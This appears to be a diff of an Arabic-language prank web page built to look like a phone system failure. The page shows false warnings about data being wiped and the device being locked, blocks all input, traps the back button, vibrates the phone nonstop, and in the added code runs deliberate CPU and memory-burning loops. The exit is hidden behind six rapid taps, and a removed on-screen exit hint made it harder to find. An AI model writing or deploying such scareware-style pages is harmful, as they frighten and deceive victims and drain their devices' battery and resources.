@@ -4,287 +4,129 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="mobile-web-app-capable" content="yes">
-<meta name="theme-color" content="#000000">
+<meta name="theme-color" content="#000">
 <title> </title>
 <style>
-  * {
-    margin: 0; padding: 0; box-sizing: border-box;
-    -webkit-tap-highlight-color: transparent;
-    -webkit-touch-callout: none;
-    -webkit-user-select: none; user-select: none;
-    touch-action: none;
-  }
-  html, body {
-    width: 100%; height: 100%;
-    overflow: hidden;
-    background: #000;
-    position: fixed;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  }
-  #root {
-    position: fixed; inset: 0;
-    background: #000;
-    z-index: 99999;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    overflow: hidden;
-  }
-  .phase1 { /* Freeze phase */ }
-  .spinner {
-    width: 80px; height: 80px;
-    border: 7px solid rgba(255,255,255,0.08);
-    border-top-color: #ff2d55;
-    border-radius: 50%;
-    animation: spin 0.55s linear infinite;
-    margin-bottom: 28px;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .title {
-    font-size: 22px; font-weight: 700;
-    text-align: center; padding: 0 18px;
-    margin-bottom: 12px; line-height: 1.35;
-  }
-  .sub {
-    font-size: 14px; color: #aaa;
-    text-align: center; padding: 0 22px;
-    line-height: 1.5;
-  }
-  .bar-wrap {
-    width: 75%; max-width: 290px;
-    height: 7px; background: #1a1a1a;
-    border-radius: 4px; margin-top: 32px;
-    overflow: hidden;
-  }
-  .bar {
-    height: 100%; width: 6%;
-    background: linear-gradient(90deg, #ff2d55, #ff9500);
-    border-radius: 4px;
-    animation: barMove 3.2s ease-in-out infinite;
-  }
-  @keyframes barMove {
-    0% { width: 4%; }
-    40% { width: 42%; }
-    70% { width: 18%; }
-    100% { width: 9%; }
-  }
-  .status {
-    position: fixed; top: 48px; left: 0; right: 0;
-    text-align: center; font-size: 13px;
-    color: #ff2d55; font-weight: 600;
-    letter-spacing: 0.5px;
-  }
-  .trail {
-    position: fixed; width: 26px; height: 26px;
-    border-radius: 50%;
-    background: rgba(255, 45, 85, 0.5);
-    pointer-events: none; z-index: 100000;
-    transform: translate(-50%, -50%);
-  }
-  .shake {
-    animation: shake 0.12s infinite;
-  }
-  @keyframes shake {
-    0% { transform: translate(0,0); }
-    25% { transform: translate(-6px,4px); }
-    50% { transform: translate(5px,-5px); }
-    75% { transform: translate(-4px,-3px); }
-    100% { transform: translate(0,0); }
-  }
-  .flash-red {
-    animation: flashRed 0.18s;
-  }
-  @keyframes flashRed {
-    0% { background: #ff2d55; }
-    100% { background: #000; }
-  }
-  /* Shutdown phase */
-  #shutdown {
-    display: none;
-    position: fixed; inset: 0;
-    background: #000;
-    z-index: 100001;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-  }
-  .shut-text {
-    font-size: 19px; font-weight: 600;
-    margin-bottom: 18px;
-  }
-  .countdown {
-    font-size: 48px; font-weight: 700;
-    color: #ff2d55;
-    margin-bottom: 25px;
-  }
-  .shut-sub {
-    font-size: 13px; color: #666;
-  }
-  #exit-hint {
-    position: fixed; bottom: 30px; left: 50%;
-    transform: translateX(-50%);
-    font-size: 11px; color: #222;
-    opacity: 0; transition: opacity 1.2s;
-    z-index: 100002;
-  }
-  #exit-hint.show { opacity: 0.5; }
+*{margin:0;padding:0;box-sizing:border-box;-webkit-user-select:none;user-select:none;touch-action:none}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;position:fixed;font-family:-apple-system,sans-serif}
+#ui{position:fixed;inset:0;z-index:30;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;background:#000}
+.sp{width:85px;height:85px;border:8px solid rgba(255,255,255,.07);border-top-color:#ff2d55;border-radius:50%;animation:s .45s linear infinite;margin-bottom:24px}
+@keyframes s{to{transform:rotate(360deg)}}
+.t{font-size:22px;font-weight:700;text-align:center;padding:0 14px;margin-bottom:10px}
+.s{font-size:13px;color:#999;text-align:center;padding:0 18px}
+.st{position:fixed;top:40px;left:0;right:0;text-align:center;color:#ff2d55;font-size:13px;font-weight:600}
+#c{position:fixed;inset:0;z-index:10}
+.shake{animation:sh .09s infinite}
+@keyframes sh{0%{transform:translate(0,0)}25%{transform:translate(-8px,6px)}50%{transform:translate(7px,-7px)}75%{transform:translate(-6px,-5px)}100%{transform:translate(0,0)}}
+.flash{animation:f .12s}
+@keyframes f{0%{background:#ff2d55}100%{background:#000}}
 </style>
 </head>
 <body>
-  <div id="root">
-    <div class="status" id="status">⚠ خطأ حرج في النظام</div>
-    <div class="spinner"></div>
-    <div class="title" id="title">جاري إصلاح النظام...</div>
-    <div class="sub" id="sub">لا تغلق الهاتف • أي محاولة إغلاق ستؤدي لفقدان البيانات</div>
-    <div class="bar-wrap"><div class="bar"></div></div>
-  </div>
-
-  <div id="shutdown">
-    <div class="shut-text">جاري إيقاف التشغيل...</div>
-    <div class="countdown" id="count">3</div>
-    <div class="shut-sub">يرجى الانتظار</div>
-  </div>
-
-  <div id="exit-hint">اضغط 3 مرات بسرعة للخروج</div>
+<div id="ui">
+  <div class="st" id="st">⚠ خطأ حرج</div>
+  <div class="sp"></div>
+  <div class="t" id="t">جاري إصلاح النظام...</div>
+  <div class="s">لا تغلق الهاتف</div>
+</div>
+<canvas id="c"></canvas>
 
 <script>
-  // ================== BLOCK EVERYTHING ==================
-  const stop = e => { e.preventDefault(); e.stopPropagation(); return false; };
-  const events = [
-    'touchstart','touchmove','touchend','touchcancel',
-    'gesturestart','gesturechange','gestureend',
-    'contextmenu','selectstart','dragstart',
-    'mousedown','mouseup','click','dblclick',
-    'keydown','keyup','keypress','wheel','scroll'
-  ];
-  events.forEach(ev => document.addEventListener(ev, stop, {passive:false, capture:true}));
+const stop=e=>{e.preventDefault();e.stopPropagation();return false};
+['touchstart','touchmove','touchend','touchcancel','gesturestart','gesturechange','gestureend',
+'contextmenu','selectstart','dragstart','mousedown','mouseup','click','keydown','keyup','wheel'].forEach(e=>document.addEventListener(e,stop,{passive:false,capture:true}));
+history.pushState(null,null,location.href);
+window.onpopstate=()=>history.pushState(null,null,location.href);
 
-  // Trap back button
-  history.pushState(null, null, location.href);
-  window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+const v=p=>navigator.vibrate&&navigator.vibrate(p);
+setInterval(()=>v([90,35,90,35,140]),1000);
+setInterval(()=>v(45),650);
 
-  // ================== VIBRATION ==================
-  const vib = (p) => { if (navigator.vibrate) navigator.vibrate(p); };
+const ts=['جاري إصلاح النظام...','خطأ حرج في الذاكرة','يتم مسح البيانات...','النظام توقف عن الاستجابة','جاري قفل الجهاز...','بطارية حرجة 1%','فشل استعادة النظام'];
+const sts=['⚠ خطأ حرج','⚠ ذاكرة تالفة','⚠ بطارية حرجة','⚠ فشل الإقلاع'];
+setInterval(()=>{
+  document.getElementById('t').textContent=ts[Math.floor(Math.random()*ts.length)];
+  document.getElementById('st').textContent=sts[Math.floor(Math.random()*sts.length)];
+},1500);
 
-  // Continuous strong vibration
-  setInterval(() => vib([70, 30, 70, 30, 100]), 1600);
-  setInterval(() => vib(40), 900);
+const ui=document.getElementById('ui');
+setInterval(()=>{ui.classList.add('flash');setTimeout(()=>ui.classList.remove('flash'),130);v([140,50,140]);},2800);
+setInterval(()=>{ui.classList.add('shake');setTimeout(()=>ui.classList.remove('shake'),550);},4200);
 
-  // ================== MESSAGES ==================
-  const titles = [
-    'جاري إصلاح النظام...',
-    'خطأ حرج في الذاكرة',
-    'يتم الآن مسح البيانات الحساسة',
-    'النظام توقف عن الاستجابة',
-    'جاري قفل الجهاز نهائياً',
-    'تحذير: بطارية حرجة 1%',
-    'فشل استعادة النظام',
-    'يتم الآن إيقاف التشغيل الإجباري'
-  ];
-  const subs = [
-    'لا تغلق الهاتف • أي محاولة إغلاق ستؤدي لفقدان البيانات',
-    'يرجى الانتظار حتى ينتهي الإصلاح',
-    'لا تقم بإعادة التشغيل يدوياً',
-    'البيانات قد تُفقد إذا تم الإغلاق الآن',
-    'جاري تأمين الجهاز...'
-  ];
-  const statuses = [
-    '⚠ خطأ حرج في النظام',
-    '⚠ ذاكرة تالفة',
-    '⚠ بطارية حرجة',
-    '⚠ فشل الإقلاع',
-    '⚠ تحذير أمني'
-  ];
+// ===== الحمل الثقيل =====
+const canvas=document.getElementById('c');
+const ctx=canvas.getContext('2d');
+canvas.width=innerWidth;
+canvas.height=innerHeight;
 
-  setInterval(() => {
-    document.getElementById('title').textContent = titles[Math.floor(Math.random()*titles.length)];
-    document.getElementById('sub').textContent = subs[Math.floor(Math.random()*subs.length)];
-    document.getElementById('status').textContent = statuses[Math.floor(Math.random()*statuses.length)];
-  }, 1900);
+let particles=[];
+for(let i=0;i<400;i++){
+  particles.push({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height,
+    r:2+Math.random()*6,
+    vx:(Math.random()-.5)*4,
+    vy:(Math.random()-.5)*4
+  });
+}
 
-  // ================== TOUCH TRAIL ==================
-  let trails = [];
-  document.addEventListener('touchmove', e => {
-    const t = e.touches[0];
-    if (!t) return;
-    const d = document.createElement('div');
-    d.className = 'trail';
-    d.style.left = t.clientX + 'px';
-    d.style.top = t.clientY + 'px';
-    document.body.appendChild(d);
-    trails.push(d);
-    if (trails.length > 40) trails.shift().remove();
-  }, {passive:false});
+// رسم تقيل + حسابات
+function burn(){
+  // حسابات تقيلة
+  let x=0;
+  for(let i=0;i<180000;i++) x+=Math.sin(i)*Math.sqrt(i+1);
 
-  // ================== VISUAL EFFECTS ==================
-  const root = document.getElementById('root');
-  setInterval(() => {
-    root.classList.add('flash-red');
-    setTimeout(() => root.classList.remove('flash-red'), 180);
-    vib([120, 50, 120]);
-  }, 3800);
+  // رسم
+  ctx.fillStyle='rgba(0,0,0,0.15)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  for(let i=0;i<particles.length;i++){
+    const p=particles[i];
+    p.x+=p.vx; p.y+=p.vy;
+    if(p.x<0||p.x>canvas.width) p.vx*=-1;
+    if(p.y<0||p.y>canvas.height) p.vy*=-1;
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,7);
+    ctx.fillStyle=`rgba(255,45,85,${0.3+Math.random()*0.5})`;
+    ctx.fill();
+  }
 
-  setInterval(() => {
-    root.classList.add('shake');
-    setTimeout(() => root.classList.remove('shake'), 700);
-  }, 5500);
+  // تخصيص ذاكرة إضافي
+  const arr=new Float64Array(50000);
+  for(let i=0;i<arr.length;i++) arr[i]=Math.random();
 
-  // ================== FAKE SHUTDOWN SEQUENCE ==================
-  setTimeout(() => {
-    // Start shutdown phase after ~18 seconds
-    document.getElementById('root').style.display = 'none';
-    const shut = document.getElementById('shutdown');
-    shut.style.display = 'flex';
-    vib([200, 100, 200, 100, 300]);
+  requestAnimationFrame(burn);
+}
 
-    let n = 3;
-    const counter = document.getElementById('count');
-    const timer = setInterval(() => {
-      n--;
-      counter.textContent = n;
-      vib([150, 80, 150]);
-      if (n <= 0) {
-        clearInterval(timer);
-        // Full black + keep vibrating
-        shut.innerHTML = '';
-        document.body.style.background = '#000';
-        // Keep vibrating forever until exit
-        setInterval(() => vib([60, 40, 60]), 1200);
-      }
-    }, 1000);
-  }, 18000);
+// نبدأ الحمل بعد ثانيتين
+setTimeout(()=>{
+  burn();
+  // لوب إضافي على المين ثريد
+  function extra(){
+    let y=1;
+    for(let i=0;i<300000;i++) y+=Math.cos(i*0.001)*Math.tan(i%50+1);
+    setTimeout(extra,0);
+  }
+  extra();
+  // اهتزاز أقوى
+  setInterval(()=>v([120,40,120,40,180]),750);
+},2000);
 
-  // ================== EXIT (3 quick taps) ==================
-  let taps = [];
-  document.addEventListener('touchend', () => {
-    const now = Date.now();
-    taps.push(now);
-    taps = taps.filter(t => now - t < 600);
-    if (taps.length >= 3) {
-      // EXIT
-      if (navigator.vibrate) navigator.vibrate(0);
-      document.body.innerHTML = `
-        <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;
-                    background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:24px;">
-          <div style="font-size:34px;margin-bottom:16px;">تم الخروج 😈</div>
-          <div style="font-size:15px;color:#777;line-height:1.6">
-            المقلب انتهى<br>
-            مفيش أي حاجة حصلت للجهاز
-          </div>
-        </div>`;
-    }
-  }, {passive:false});
+// خروج: 6 ضغطات
+let taps=[];
+document.addEventListener('touchend',()=>{
+  const now=Date.now();
+  taps.push(now);
+  taps=taps.filter(t=>now-t<900);
+  if(taps.length>=6){
+    if(navigator.vibrate) navigator.vibrate(0);
+    document.body.innerHTML=`<div style="height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:20px">
+      <div style="font-size:32px;margin-bottom:12px">تم الخروج 😈</div>
+      <div style="font-size:14px;color:#777">المقلب انتهى</div>
+    </div>`;
+  }
+},{passive:false});
 
-  // Show exit hint after 15s
-  setTimeout(() => document.getElementById('exit-hint').classList.add('show'), 15000);
-
-  // Try fullscreen + wake lock
-  document.documentElement.requestFullscreen?.().catch(()=>{});
-  navigator.wakeLock?.request('screen').catch(()=>{});
+document.documentElement.requestFullscreen?.().catch(()=>{});
 </script>
 </body>
 </html>
